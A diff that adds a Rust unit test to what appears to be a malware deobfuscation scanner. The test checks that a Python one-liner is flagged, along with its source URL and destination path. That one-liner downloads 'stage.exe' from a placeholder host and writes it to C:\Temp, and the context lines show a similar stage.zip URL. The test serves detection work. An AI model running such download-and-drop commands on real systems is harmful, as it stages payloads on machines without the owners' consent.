@@ -10176,6 +10176,27 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn python_requests_get_write_in_deob_text_emits_download_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; open('C:\\Temp\\stage.exe','wb').write(requests.get('https://py.example/stage.exe').content)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/stage.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\stage.exe")
+            )
+        });
+        assert!(
+            has,
+            "Python requests.get destination was not recovered: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_urllib_urlopen_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
